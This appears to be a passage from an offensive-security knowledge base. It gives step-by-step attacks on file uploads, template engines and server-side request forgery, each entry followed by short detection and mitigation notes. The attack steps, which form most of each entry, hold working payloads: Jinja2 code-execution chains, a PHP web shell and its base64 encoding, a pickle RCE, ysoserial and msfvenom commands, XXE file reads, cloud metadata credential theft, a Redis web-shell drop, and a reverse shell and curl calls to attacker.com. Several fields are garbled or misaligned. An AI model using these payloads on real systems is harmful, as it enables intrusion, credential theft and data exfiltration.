- **Attack Steps**: Step 1: Determine if the server uses a template engine like Jinja2 (Python), Twig (PHP), or ERB (Ruby). These engines often render uploaded content like .html or .md files. Step 2: Create a file named malicious.html or invoice.md containing template payload: {{ __import__('os').system('ls') }} (Jinja2 example). Step 3: Upload this file to the app (e.g., resume, invoice, blog post, or report upload). Step 4: Try to view the uploaded file in the app. If the server renders the content using the template engine, the payload executes and runs ls. Step 5: Use variations based on engine: e.g., {{ system('ls') }} for Twig, <%= ls %> for ERB. Step 6: Try whoami, id, curl attacker.com, etc., to confirm RCE. Step 7: This works because user-controlled templates are rendered without sandboxing. Step 8: You may need to rename file to .md or .html to trigger rendering. Step 9: Use on Flask apps, Laravel with Twig, or Ruby on Rails with ERB. Step 10: Practice in TryHackMe’s “Jinja2 Injection” room.
- **Detection**: Detect use of {{ or <%= in uploaded files; log unusual template renders
- **Solution**: Never render uploaded content directly; use sandboxes; escape user content in templates
- **Tags**: Template Injection, Jinja2 RCE, Twig Upload

## Stored Payload in Template Field

- **Attack Type**: Stored RCE via Unsanitized Template Field
- **Target**: Jinja2/Twig/ERB Render Targets
- **Vulnerability**: Template rendering of user-supplied fields
- **MITRE**: T1059.007 – User Input to Template Engine
- **Impact**: Backend RCE via filename/field injection
- **Tools**: Burp Suite, Flask app, metadata injectors
- **Scenario**: Instead of uploading a file, attacker uses file name or metadata fields to inject template code that executes when processed/rendered by the server.
- **Attack Steps**: Step 1: Prepare a normal file (e.g., resume.jpg), but rename the file to {{ config.items() }} or {{ __import__('os').system('id') }}. Step 2: Upload the file via a vulnerable form. Step 3: If the app stores the filename and later renders it in a template (e.g., on a dashboard or admin panel), the template engine will evaluate the injected code. Step 4: Use Burp Suite to test multiple fields: try injecting payloads into description, title, or metadata if available. Step 5: Once the app displays that metadata inside a rendered page without escaping, the template engine executes it. Step 6: If whoami or id is shown in the rendered page, you’ve achieved RCE. Step 7: This method doesn’t need a file upload — any field rendered via template is a vector. Step 8: Test this in Flask or Laravel apps that use Jinja2/Twig to build HTML pages dynamically from user input. Step 9: Commonly missed by developers who trust metadata as safe. Step 10: You can chain this with SSRF or XSS for deeper exploits.
- **Detection**: Look for {{ or <%=  in rendered user input; monitor unexpected system calls
- **Solution**: Always escape user input in templates; use `{{ variable
- **Tags**: e }}` in Jinja2 to prevent execution

## Malicious .htaccess to Enable RCE

- **Attack Type**: Web Server Configuration Abuse
- **Target**: Apache Upload Folder
- **Vulnerability**: .htaccess override enabled for upload folders
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: File treated as executable → Remote Code Execution
- **Tools**: Burp Suite, .htaccess file, Apache server
- **Scenario**: Apache web servers interpret .htaccess files. Attackers upload one that changes MIME rules to execute uploaded .jpg or .txt as PHP or scripts.
- **Attack Steps**: Step 1: Create a .htaccess file with the following content: AddType application/x-httpd-php .jpg and AddHandler application/x-httpd-php .jpg. This tells Apache to execute .jpg files as PHP. Step 2: Upload this file to a folder like /uploads/ that is publicly served and .htaccess is not blocked. Step 3: Next, upload a polyglot image containing PHP code inside (see Part 12 – SEC-244). Name it shell.jpg. Step 4: Access shell.jpg?cmd=whoami. Apache, due to your .htaccess, now executes shell.jpg as PHP. Step 5: If server is vulnerable, this results in command execution. Step 6: This technique abuses Apache's .htaccess override feature, especially in shared hosting. Step 7: Also try .user.ini for PHP on CGI setups to change auto_prepend_file. Step 8: Works best on older servers or misconfigured shared hosts. Step 9: You can chain this with Content-Type Bypass or Polyglot Uploads. Step 10: Check for .htaccess execution by uploading a test .htaccess and viewing its effect on error pages or MIME behavior.
- **Detection**: Monitor for .htaccess uploads; check MIME misbehavior in uploads
- **Solution**: Disallow .htaccess uploads; disable AllowOverride in Apache; move uploads outside document root
- **Tags**: Apache Config Abuse, .htaccess Exploit, MIME Override

## SSTI via Template Rendering (Stored in File)

- **Attack Type**: Server-Side Template Injection (via upload)
- **Target**: Flask / Jinja2 Templates
- **Vulnerability**: Unescaped template rendering of uploaded files
- **MITRE**: T1059.007 – Command via Template Engine
- **Impact**: Full server-side RCE through stored SSTI in upload
- **Tools**: Burp Suite, Flask App, Jinja2 payloads
- **Scenario**: Upload file with SSTI payload that gets rendered by template engine (e.g., Flask/Jinja2). Payload executes backend code when rendered.
- **Attack Steps**: Step 1: Create a file called invoice.html or report.txt with the content: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}. Step 2: Upload this file using the web app’s upload feature (e.g., submit report, resume, or document). Step 3: Check if the app later renders the uploaded file’s content on a dashboard, preview screen, or internal admin interface. Step 4: If it uses Flask + Jinja2 and renders without escaping, your payload will execute and run the id command. Step 5: You’ll see something like uid=33(www-data) on the screen, proving RCE. Step 6: Variations: use {{ cycler.__init__.__globals__.os.popen('ls').read() }} or {{ self._TemplateReference__context.cycler.__init__.__globals__.os.system('whoami') }}. Step 7: This works in apps that trust uploaded files and render them using Jinja2. Step 8: You can also inject the payload in file name, description, or metadata if that gets rendered via Jinja2. Step 9: Test using Flask apps or DVWA-like labs. Step 10: Always confirm backend template engine to choose correct syntax (e.g., Twig for PHP, ERB for Ruby).
- **Detection**: Monitor for {{ in rendered files; alert on os.popen or subprocess usage
- **Solution**: Never render uploaded content directly; escape variables using `{{ var
- **Tags**: e }}` in Jinja2

## Base64 or Hex-Encoded File Upload

- **Attack Type**: Encoded Payload Bypass
- **Target**: PHP / JSP / ASP Backends
- **Vulnerability**: Server decodes and executes encoded file content
- **MITRE**: T1203 – Exploitation for Execution
- **Impact**: Remote execution via upload → base64 decode → run
- **Tools**: Burp Suite, PHP base64 functions, data:// wrappers
- **Scenario**: Bypass file type filters that reject .php by encoding malicious payload and using data wrappers or server-side decoding logic.
- **Attack Steps**: Step 1: Write a simple PHP web shell like <?php system($_GET['cmd']); ?>. Step 2: Encode the payload using Base64: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+. Step 3: Upload this base64 string inside a file named shell.txt or encoded.txt – or use data:// stream wrappers in URLs like data://text/plain;base64,PD9waHAgc3.... Step 4: If the server uses PHP's include() or file_get_contents() on the uploaded file, it may decode and execute it. Step 5: On some misconfigured PHP servers, you can trigger this by uploading the encoded file and accessing it via a crafted URL. Step 6: Alternatively, chain with LFI: if there's an LFI in the app (e.g., /view?file=shell.txt), the server may decode and execute the uploaded payload. Step 7: Use php://filter/convert.base64-decode/resource=shell.txt as another trick. Step 8: This bypass works where .php is blocked but the backend processes or decodes file content. Step 9: Also try hex-encoding the payload (for ASP/JSP) and decoding it with scripting logic (e.g., Java’s Base64.getDecoder().decode()). Step 10: This technique is great for stealthy uploads when MIME filters block dangerous extensions.
- **Detection**: Alert on data:// or php://filter references; log unexpected Base64 decoding in backend
- **Solution**: Disallow dangerous stream wrappers; validate content type and disable risky input sources
- **Tags**: Base64 Payload Upload, Wrapper Bypass, Encoded RCE

## PDF Upload with Embedded JS or Shellcode

- **Attack Type**: Embedded JavaScript or Shellcode in PDFs
- **Target**: PDF Document Parsers
- **Vulnerability**: Executable JS or shellcode inside PDF file
- **MITRE**: T1203 – Exploitation of Client/Parser Tools
- **Impact**: File preview triggers malware execution or data leak
- **Tools**: PDFedit, Burp Suite, Evince, Metasploit, Didier Stevens
- **Scenario**: Attacker uploads PDF with embedded JavaScript or malicious shellcode. If parsed or opened server-side, JS may execute → file write, DNS request, RCE, or data leak.
- **Attack Steps**: Step 1: Use PDFedit, Didier Stevens' make-pdf-javascript.py, or msfvenom to craft a PDF with JavaScript payload. Example JS: app.alert('Hacked!') or this.exportDataObject({ cName: 'pwnd.txt', nLaunch: 2 });. Step 2: Save file as resume.pdf or report.pdf. Step 3: Upload this via the target web app's upload feature. Step 4: If the backend opens or parses the file (e.g., with Poppler, pdf2text, or preview generator), the JS can trigger. Step 5: Alternatively, embed shellcode in an object stream using tools like Metasploit's fileformat module: msfvenom -p windows/meterpreter/reverse_tcp -f exe > shell.exe, then embed this in a PDF stream. Step 6: Upon parsing or preview, backend may trigger shellcode or export payload. Step 7: This also works when files are auto-sent to antivirus, indexing, or OCR tools with low sandboxing. Step 8: Use Didier’s tools to embed EXE and launch: make-pdf-embedded.exe. Step 9: PDFs are trusted in many workflows (resumes, legal docs), making this vector powerful. Step 10: Check for detection by seeing if JS alerts or callbacks trigger in internal dashboards.
- **Detection**: Log embedded JS usage in PDF; use PDF sandboxing tools like PDFium or disable JS in backend processors
- **Solution**: Strip active content from PDFs; don’t use PDF viewers that run JS or embedded binaries
- **Tags**: PDF Upload, JS in PDF, Embedded Shellcode, Resume Exploit

## SVG File with Embedded JavaScript / XXE

- **Attack Type**: SVG Upload → JavaScript or XXE Injection
- **Target**: Web Frontends, XML Parsers
- **Vulnerability**: Embedded script or XXE in SVG file
- **MITRE**: T1207 – XXE / T1059 – JS via SVG
- **Impact**: File read, XSS, remote file fetch, server-side code execution
- **Tools**: Burp Suite, VS Code, svg-injector, XML Lint, XXE payloads
- **Scenario**: Upload SVG with <script> or XML entities. If rendered in browser or parsed server-side with XXE-vulnerable parser, attacker gains file read or RCE.
- **Attack Steps**: Step 1: Create an SVG file called evil.svg. Add malicious code like: <svg><script>alert("Hacked")</script></svg>. For XXE, add: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>. Step 2: Upload evil.svg to the target app using a document or image upload feature. Step 3: If the app renders it directly into HTML (e.g., <img src="uploads/evil.svg"> or embeds content), the <script> will execute in the victim's browser (XSS). Step 4: If the app parses the file using vulnerable XML libraries (e.g., lxml, libxml2, DOMDocument), XXE will resolve file:///etc/passwd, leaking system files. Step 5: Try internal file paths like /var/www/config.json or file:///c:/windows/win.ini on Windows. Step 6: If file read is visible in browser or in preview, vulnerability is confirmed. Step 7: Add exfiltration via DNS or HTTP in <!ENTITY xxe SYSTEM "http://attacker.com/leak.txt">. Step 8: Detection is easy by monitoring SVG render requests and outgoing DNS or HTTP calls. Step 9: This attack is common on resume/profile pic upload or SVG-based chart renderers.
- **Detection**: Monitor outbound file reads and XML errors; flag inline SVG rendering with script or DOCTYPE
- **Solution**: Disable inline <script> in SVGs; block DOCTYPE in XML parsers; always sanitize uploaded images
- **Tags**: SVG Injection, XXE, File Read, JavaScript in SVG

## Upload .py or .pl File for Code Execution

- **Attack Type**: Unsafe Script Execution via Upload
- **Target**: ML Platforms, Data Science Tools
- **Vulnerability**: Execution of uploaded code/script files
- **MITRE**: T1059 – Command Execution via Script Files
- **Impact**: RCE, data theft, server compromise
- **Tools**: Burp Suite, Python, Perl, file upload forms
- **Scenario**: If the backend accepts uploaded scripts and executes them (e.g., Python/Perl for ML training), attacker gains command execution.
- **Attack Steps**: Step 1: Create a file named payload.py with the content: import os; os.system('whoami'). Alternatively, use subprocess.call(['curl', 'http://attacker.com']) to exfiltrate data. Step 2: Upload this .py file via the app’s document upload or ML input feature (e.g., "upload preprocessing script", "submit training script"). Step 3: If the server blindly runs uploaded scripts (e.g., python payload.py), the system command executes. Step 4: You can escalate by chaining reverse shell payloads: os.system('bash -i >& /dev/tcp/attacker.com/4444 0>&1'). Step 5: If the app uses cron or job queue to run scripts, wait for processing delay and check your logs for hits. Step 6: This vulnerability is common in ML inference platforms, AI model trainers, or admin-only script runners with weak upload control. Step 7: Works similarly for .pl (Perl): system("curl http://attacker.com"). Step 8: Try uploading .py.txt or .py~ if direct .py is blocked, and rename via traversal or logic flaw. Step 9: If allowed, full RCE is possible with attacker-controlled logic. Step 10: Detection includes logging unexpected shell commands and reviewing execution paths post-upload.
- **Detection**: Monitor for new .py/.pl uploads; scan uploads for os.system or suspicious imports
- **Solution**: Never execute uploaded scripts; sandbox training scripts or evaluate in a jailed container
- **Tags**: Script Upload, Unsafe ML Backend, Python RCE

## Deserialization via File Upload (Pickle, Java)

- **Attack Type**: File Upload → Deserialization Gadget
- **Target**: Python, Java, Node Backends
- **Vulnerability**: Unsafe deserialization during file processing
- **MITRE**: T1486 – Execution via Deserialization
- **Impact**: Full command execution during object loading
- **Tools**: Burp Suite, ysoserial, pickletools, Java apps
- **Scenario**: Upload a malicious pickle, Java object, or JSON payload. If deserialized server-side without validation, leads to RCE or file access.
- **Attack Steps**: Step 1: Create a malicious Python Pickle file using: import pickle, os; class RCE: def __reduce__(self): return (os.system, ("whoami",)); pickle.dump(RCE(), open("payload.pkl", "wb")). Step 2: Upload payload.pkl through an "upload dataset" or "upload model" feature. Step 3: If the server loads files using pickle.load(), the embedded os.system("whoami") will execute. Step 4: Use subprocess, reverse shells, or file access commands to elevate. Step 5: For Java, generate payloads using ysoserial like: java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com' > payload.ser. Step 6: Upload payload.ser if the app uses ObjectInputStream.readObject() in backend. Step 7: If deserialization is automatic, it will trigger during model load, object import, or preview. Step 8: Also works with serialized Node.js/BSON objects, if eval() is used on JSON. Step 9: This vulnerability is dangerous and commonly found in AI/ML pipelines, configuration imports, and analytics tools. Step 10: Detection includes system logs, outbound HTTP calls, or failure in loading the file with stack trace.
- **Detection**: Monitor use of pickle, readObject(), and unexpected system commands during file load
- **Solution**: Avoid pickle and Java object deserialization; use json.load and strict schema parsing
- **Tags**: Pickle Upload, Java Deserialization, Object RCE

## Template Injection via File Name Rendering

- **Attack Type**: Filename-based Server-Side Template Injection
- **Target**: e` in Jinja2), validate filename on upload.
- **Vulnerability**: Flask, Twig, ERB Templates
- **MITRE**: Dynamic rendering of file names without sanitization
- **Impact**: T1059.007 – Command via Template Engine
- **Tools**: Burp Suite, Flask App, template engine
- **Scenario**: Upload a file with a name like {{7*7}}.jpg. If app renders filenames dynamically with Jinja2 or similar, payload executes.
- **Attack Steps**: Step 1: Rename your file to {{7*7}}.jpg or {{config.items()}}.png. Step 2: Upload via a web form that lets users upload profile pics, invoices, or documents. Step 3: If the server later renders the filename using a templating engine (e.g., {{ filename }} in Jinja2), your payload will be evaluated. Step 4: If rendering is unescaped, {{7*7}} becomes 49, proving SSTI. Step 5: Try full payloads like {{config.__class__.__init__.__globals__['os'].popen('id').read()}}.jpg. Step 6: Once uploaded, check where the file name is displayed (e.g., dashboard, admin panel, preview). Step 7: If command output shows, you have full RCE. Step 8: This often works where apps render filenames or descriptions in dynamically generated templates without escaping. Step 9: Detection involves viewing rendered templates for signs of injection (49, system output). Step 10: Defense: escape all dynamic data (`
- **Detection**: RCE through file name injection
- **Solution**: Monitor template evaluation errors or rendered output showing math/system command results
- **Tags**: Always escape template variables; never render filenames directly

## Log Poisoning → File Upload Not Required

- **Attack Type**: Server-Side Template Injection via Logs
- **Target**: Flask Apps, Logging Dashboards
- **Vulnerability**: Logs rendered using unsafe templating (Jinja, etc.)
- **MITRE**: T1059.007 – Command via Template Engine
- **Impact**: Remote code execution without upload or auth
- **Tools**: Burp Suite, curl, Flask app, browser
- **Scenario**: Attacker injects malicious payload into server logs (e.g., via User-Agent). If logs are later rendered in templates (e.g., admin panel), the payload may execute as code.
- **Attack Steps**: Step 1: Open Burp Suite or terminal. Prepare a payload like: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}. Step 2: Send a request to the web app (any page like /contact, /login) with this payload inside the User-Agent header. Example with curl: curl -A "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" http://target.com/login. Step 3: This payload gets saved in the server log file (e.g., /var/log/nginx/access.log or app logs). Step 4: If the application has an admin panel, log viewer, or dashboard that dynamically renders logs using a vulnerable template engine (like Jinja2), the payload will execute. Step 5: Check if you can view logs via /admin/logs, /debug, or /status. If rendered without escaping, id will execute, and you’ll see output like uid=33(www-data). Step 6: You can then try commands like whoami, ls, or curl attacker.com. Step 7: No file upload is needed—just headers! Step 8: Combine with log file inclusion (LFI) or template rendering paths for deeper impact. Step 9: Test different headers (Referer, X-Forwarded-For) to bypass filters. Step 10: Works well in apps using log-based dashboards or diagnostics tools that auto-render log content.
- **Detection**: Monitor for template expressions ({{, .__globals__) in logs; log rendering errors
- **Solution**: Never render logs directly using template engines; escape all log output
- **Tags**: Log Poisoning, Header Exploit, Jinja2, RCE

## WAF/Antivirus Evasion via Encoded Payloads

- **Attack Type**: Obfuscated Payload to Bypass Filters
- **Target**: Upload Parsers, WAF-Protected Servers
- **Vulnerability**: Signature-based detection bypassed using encoding
- **MITRE**: T1203 – Exploitation for Defense Evasion
- **Impact**: Upload bypass, AV evasion, WAF filter bypass
- **Tools**: Burp Suite, Base64 encoder, Hex encoder, CyberChef
- **Scenario**: Attackers encode or disguise malicious payloads (e.g., PHP, shellcode) to evade detection by firewalls, AV engines, or upload filters.
- **Attack Steps**: Step 1: Write your attack payload (e.g., PHP shell): <?php system($_GET['cmd']); ?>. Step 2: Encode it using Base64: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+. Step 3: Create a file shell.txt or evade.php.jpg containing the encoded string. Step 4: Upload the file to the app (e.g., image upload, resume upload). Step 5: If WAF blocks .php, try .php.jpg, .phtml, .php;.jpg, or use alternate content types (e.g., image/jpeg). Step 6: If upload is successful, access the file via its public URL: http://target/uploads/shell.php.jpg. Step 7: If the server executes it despite extension, payload runs. Step 8: If it doesn't work, use php://filter/convert.base64-decode/resource=shell.txt trick if LFI is possible. Step 9: Try different encodings (hex, Unicode): e.g., %3C%3Fphp%20system(%24_GET%5B%27cmd%27%5D)%3B%20%3F%3E. Step 10: This tactic helps when WAFs or AVs inspect only raw file content or reject dangerous strings like <?php. Obfuscation defeats pattern-based scanners. Confirm success by catching command output or a reverse shell hit.
- **Detection**: Alert on encoded payloads or suspicious filename tricks; base64/hex usage near critical endpoints
- **Solution**: Decode and scan all uploads server-side; block double extensions; validate MIME + content headers
- **Tags**: WAF Bypass, Base64 Payload, AV Evasion, PHP Upload

## Basic SSRF via URL Parameter

- **Attack Type**: Server-Side Request Forgery (Basic)
- **Target**: Image Previewers, Fetch APIs
- **Vulnerability**: Lack of request destination validation
- **MITRE**: T1213 – Data from Information Repositories
- **Impact**: Internal service access, port scanning
- **Tools**: Burp Suite, curl, Interactsh
- **Scenario**: App allows users to provide a URL to fetch data (e.g., image, website preview). If the server does not validate the destination, attacker can access internal services.
- **Attack Steps**: Step 1: Find a URL parameter that fetches data from user input (e.g., GET /fetch?url=https://example.com). This often exists in image previewers, RSS readers, PDF converters. Step 2: Replace the value with your own URL (e.g., http://burpcollaborator.net) to see if the server fetches from external sources. Step 3: Then test internal IPs: http://127.0.0.1, http://localhost, http://169.254.169.254 or http://internal.service.local. Step 4: If the server responds with internal data (e.g., from Redis, Apache, internal dashboard), SSRF is confirmed. Step 5: You can enumerate open ports by trying different ports (http://127.0.0.1:22, :3306, :8000). Step 6: Also try file protocol if applicable: file:///etc/passwd. Step 7: This allows attackers to pivot into internal networks from a vulnerable frontend.
- **Detection**: Monitor outbound HTTP/DNS from frontend servers
- **Solution**: Block internal IP ranges, allow-list only specific domains, enforce SSRF protection libraries
- **Tags**: SSRF, URL Fetch, Localhost Access

## Blind SSRF with DNS Exfiltration

- **Attack Type**: Server-Side Request Forgery (Blind)
- **Target**: API Proxies, Image Fetchers
- **Vulnerability**: SSRF without response visibility
- **MITRE**: T1595 – Active Scanning
- **Impact**: Proves SSRF with no feedback, confirms server behavior
- **Tools**: Interactsh, Burp Collaborator, curl
- **Scenario**: Server makes HTTP request but doesn't show the result. Attacker uses DNS logging server (like Burp Collaborator or Interactsh) to detect the request.
- **Attack Steps**: Step 1: Register a DNS logging domain via Interact.sh or Burp Collaborator. You'll get a domain like abcd123.interactsh.com. Step 2: Find a URL input field in the web app (e.g., GET /ping?target=...). Step 3: Replace the input with your Interact domain: http://abcd123.interactsh.com. Step 4: Even if the app doesn’t show output, check your Interact panel—if the request was made, the domain will be triggered and logged. Step 5: Try different protocols: gopher://, ftp://, dict://, or dns://abcd123.interactsh.com. Step 6: This proves the server can make outbound calls (Blind SSRF). Step 7: This technique is useful when exploiting SSRF to internal APIs or metadata where responses aren't returned. Step 8: You can also use encoded payloads like http://169.254.169.254@abcd123.interactsh.com.
- **Detection**: Monitor DNS and outbound traffic to unknown domains
- **Solution**: Disable outbound requests to untrusted domains; log DNS queries from apps
- **Tags**: Blind SSRF, DNS Logging, Interactsh

## SSRF to Internal Admin Panel

- **Attack Type**: SSRF for Internal Recon / Panel Access
- **Target**: Internal Dashboards, Admin APIs
- **Vulnerability**: Access control missing on internal services
- **MITRE**: T1069.001 – Admin Panel Discovery
- **Impact**: Unauthorized access to private panels
- **Tools**: Burp Suite, Interactsh, curl
- **Scenario**: Attacker uses SSRF to access internal-only admin panels or dashboards not normally exposed to external users.
- **Attack Steps**: Step 1: Identify SSRF point, such as image downloader, RSS fetcher, or test form that accepts a URL. Step 2: Test internal IP ranges: http://127.0.0.1:8000/admin, http://localhost:8080/, http://192.168.0.1/dashboard, http://10.0.0.5:5000/. Step 3: Observe returned content—if the response contains login screens, JSON, HTML, etc., an internal panel is exposed. Step 4: Dump the HTML or screenshot the admin interface if visible. Step 5: Try accessing endpoints like /metrics, /logs, /env, /admin. Step 6: Use SSRF to perform POST requests if supported to simulate logins or action triggers (e.g., POST /restart). Step 7: Try SSRF port scanning to find open services and explore more endpoints. Step 8: This allows full access to restricted internal services via the frontend server. Step 9: Combine with XSS, Log Poisoning, or template injection for privilege escalation.
- **Detection**: Detect traffic from public frontend to private IP spaces
- **Solution**: Place internal services behind firewall or authentication, prevent SSRF into 127.0.0.1 ranges
- **Tags**: SSRF Admin Access, Local Network Attack

## SSRF to Cloud Metadata Endpoint (AWS/GCP)

- **Attack Type**: SSRF for Cloud Info Disclosure
- **Target**: AWS, GCP, Azure Cloud Instances
- **Vulnerability**: Metadata API exposure via SSRF
- **MITRE**: T1526 – Cloud Account Discovery
- **Impact**: Cloud takeover, key leakage, full environment access
- **Tools**: curl, Burp Suite, EC2 instance, Postman
- **Scenario**: SSRF used to query cloud instance metadata API and steal cloud credentials. AWS, GCP, Azure expose sensitive data at fixed internal IPs.
- **Attack Steps**: Step 1: Locate SSRF input like GET /fetch?url=. Step 2: Use internal IPs to target metadata: http://169.254.169.254/latest/meta-data/ (AWS), http://metadata.google.internal/computeMetadata/v1/ (GCP), http://169.254.169.254/metadata/instance?api-version=2021-01-01 (Azure). Step 3: If SSRF works, this endpoint will return sensitive information such as IAM roles, access tokens, instance names, SSH keys. Step 4: For AWS, query .../iam/security-credentials/ and fetch the token under EC2 role. Step 5: Use the stolen token with AWS CLI: aws s3 ls --region us-east-1 --profile stolen-creds. Step 6: If response is JSON, save it for local inspection. Step 7: With valid cloud tokens, you can access cloud resources, S3 buckets, or escalate privileges. Step 8: This is one of the most critical SSRF chains. Step 9: Combine with WAF bypass (e.g., use @ symbol: http://169.254.169.254@evil.com) to fool filters. Step 10: Log access and rotate IAM credentials immediately if suspicious access detected.
- **Detection**: Monitor calls to metadata IPs, alert on suspicious outbound traffic from app
- **Solution**: Block all access to metadata IPs from web-facing components; use IMDSv2 or metadata shielding
- **Tags**: SSRF Cloud, Metadata Leak, Token Theft

## SSRF via Open Redirect Abuse

- **Attack Type**: SSRF via Redirection Chain
- **Target**: URL Fetchers, Redirect Handlers
- **Vulnerability**: Open Redirects + Weak SSRF Filters
- **MITRE**: T1213 – Data from Info Repositories
- **Impact**: Bypass SSRF filters, access internal systems
- **Tools**: Burp Suite, curl, Interactsh
- **Scenario**: Attacker abuses an open redirect endpoint to bounce requests to internal resources, even if SSRF protections are in place.
- **Attack Steps**: Step 1: Identify an open redirect on the target site, like https://victim.com/redirect?url=https://evil.com. Confirm it redirects without validation. Step 2: Use this redirect to disguise a malicious request. Instead of calling http://169.254.169.254 directly (which might be blocked), craft: https://victim.com/redirect?url=http://169.254.169.254/latest/meta-data/. Step 3: Submit this as part of a feature that fetches URLs from user input (e.g., /fetch?url=https://victim.com/redirect?...). Step 4: The server fetches the provided URL → gets redirected to internal IP → SSRF executed. Step 5: If it returns metadata, internal dashboard, or localhost data, SSRF worked. Step 6: Use this to access cloud tokens or internal panels without triggering SSRF filters directly. Step 7: Combine with DNS logging (Interactsh) to confirm blind SSRF.
- **Detection**: Monitor for redirections to internal IPs; log unexpected redirect chains
- **Solution**: Validate redirect destinations strictly; block chaining redirects to private/internal IPs
- **Tags**: Open Redirect, SSRF Bypass, Cloud Metadata Access

## SSRF via Host Header Injection

- **Attack Type**: SSRF via Host Header Manipulation
- **Target**: Reverse Proxies, Server Logic
- **Vulnerability**: Host header not validated or trusted
- **MITRE**: T1557.001 – Adversary-in-the-Middle
- **Impact**: SSRF, phishing, internal routing abuse
- **Tools**: Burp Suite, curl
- **Scenario**: Exploits trust in Host header by modifying it to access internal resources or poison downstream requests.
- **Attack Steps**: Step 1: Find any HTTP request where Host header might influence backend logic. Login forms, password reset emails, or fetchers are good candidates. Step 2: Use Burp Suite to modify the Host: header in your request. Change it from Host: victim.com to Host: 127.0.0.1 or Host: internal.service. Step 3: If the app uses Host header to make internal requests (e.g., behind a proxy), this could result in SSRF. Step 4: For password reset emails, send a reset and check if the link includes your malicious Host → proving header injection. Step 5: Some apps also allow absolute URLs in form posts or API calls. Submit http://127.0.0.1 or internal URLs and override the Host header with a fake public domain. Step 6: In cloud apps, this might leak metadata if the backend makes calls using unvalidated Host headers. Step 7: Also test X-Forwarded-Host, X-Original-URL, and X-Forwarded-For as fallback headers.
- **Detection**: Monitor for mismatched Host header vs destination URL
- **Solution**: Use strict Host header checks; never trust Host headers for backend routing decisions
- **Tags**: Host Injection, SSRF, Header Manipulation

## SSRF via Gopher Protocol to Redis

- **Attack Type**: SSRF for Redis Remote Command Execution
- **Target**: Redis over localhost, SSRF-capable apps
- **Vulnerability**: SSRF to unprotected Redis service
- **MITRE**: T1210 – Exploitation of Remote Services
- **Impact**: Remote Code Execution, config poisoning
- **Tools**: Burp Suite, Gopherus, Redis-CLI, curl
- **Scenario**: Attacker uses gopher:// protocol to exploit SSRF and send raw commands to internal services like Redis, leading to RCE or config change.
- **Attack Steps**: Step 1: Find an SSRF input (e.g., /preview?url=...) that allows protocols like gopher://. This usually requires relaxed URL validation. Step 2: Use a tool like Gopherus to craft a Redis payload to write a web shell into a writable directory (e.g., /var/www/html/shell.php). Step 3: Gopherus will generate a gopher:// URL encoding Redis commands. Example: gopher://127.0.0.1:6379/_SET test_key "<?php system($_GET['cmd']); ?>". Step 4: Paste the generated payload into the SSRF parameter and submit it. The request will connect to Redis running locally and execute the commands. Step 5: After successful payload injection, access the dropped file in the webroot: http://victim.com/shell.php?cmd=id. Step 6: You now have RCE via SSRF and Redis misconfiguration. Step 7: Test other Redis operations like FLUSHALL, CONFIG SET, SLAVEOF, or create cron jobs via Redis if webroot is not writable.
- **Detection**: Monitor for unusual SSRF attempts using gopher:// or Redis ports (6379)
- **Solution**: Block gopher:// scheme; bind Redis to 127.0.0.1 with password auth; never expose to frontend SSRF inputs
- **Tags**: SSRF, Redis, Gopher, Internal Access

## SSRF via FTP Protocol

- **Attack Type**: SSRF using FTP for Port Scan or DOS
- **Target**: Internal Services, Network Interfaces
- **Vulnerability**: SSRF with protocol support too relaxed
- **MITRE**: T1595 – Active Scanning
- **Impact**: Network mapping, DoS, potential enumeration
- **Tools**: curl, Burp Suite, Wireshark
- **Scenario**: FTP protocol can be abused in SSRF to enumerate internal services (port scanning), denial of service, or detect open services.
- **Attack Steps**: Step 1: Find SSRF input that does not block protocols like ftp://. Examples: /fetch?url=ftp://127.0.0.1:21. Step 2: Use this to perform a basic scan: test internal IPs like ftp://192.168.1.1:22, :25, :3306 etc. Server will behave differently based on open/closed status. Step 3: If FTP is open, SSRF may hang or return FTP banners. Step 4: Advanced use: try using FTP passive mode to force connections or flood resources (basic DoS vector). Step 5: Not typically used for data exfiltration, but helpful in mapping internal networks via timing and behavior. Step 6: Record the delays in responses to infer port status. Step 7: Combine with Interactsh or Burp Collaborator to confirm backend request path. Step 8: Can be paired with gopher or HTTP SSRF chains for full network traversal.
- **Detection**: Log SSRF protocol usage, alert on ftp:// pattern
- **Solution**: Disable FTP handling entirely in URL parsers; reject unknown protocol schemes
- **Tags**: FTP SSRF, Port Scanning, Passive DoS

## SSRF via File Protocol (file://)

- **Attack Type**: SSRF for Local File Inclusion via file://
- **Target**: Web servers, file readers
- **Vulnerability**: Lack of protocol filtering in SSRF endpoints
- **MITRE**: T1087 – Account Discovery
- **Impact**: Local file disclosure from server filesystem
- **Tools**: Burp Suite, curl
- **Scenario**: If a server-side app fetches a URL and accepts the file:// protocol, an attacker may read local files from the backend server (like /etc/passwd, app config, SSH keys).
- **Attack Steps**: Step 1: Find an SSRF entry point where the app takes in a user-supplied URL (e.g., image previewer, GET /fetch?url=). Step 2: Instead of using http://, use file:///etc/passwd. The app may attempt to open that file from the server’s local file system. Step 3: If vulnerable, you will see content like usernames and hashed passwords (from /etc/passwd) returned in the HTTP response. Step 4: Try other files like file:///proc/self/environ, file:///root/.ssh/id_rsa, or any configuration file. Step 5: If the app blocks the protocol, try bypasses like fIlE:///etc/passwd or double URL encoding. Step 6: This attack allows you to leak sensitive files from the server without any authentication. Step 7: Combine this with LFI or error-based responses to leak content even when not directly shown.
- **Detection**: Monitor for file:// usage in URLs; log suspicious local file access attempts
- **Solution**: Block all non-http/https protocols in SSRF parsers; use input allowlists
- **Tags**: SSRF, Local File Read, Protocol Abuse

## SSRF via PHP Wrapper (php://input, filter)

- **Attack Type**: SSRF Bypass via php:// Wrappers
- **Target**: PHP-based backends with file handling
- **Vulnerability**: Unsafe use of PHP wrappers as resource input
- **MITRE**: T1140 – Deobfuscate/Decode Files or Info
- **Impact**: File read, code execution, source code leakage
- **Tools**: Burp Suite, curl, base64 tools
- **Scenario**: In PHP-based apps, attacker abuses php:// wrappers to read input streams, filter base64 content, or bypass file type filters. Often chained with file read or upload-based attacks.
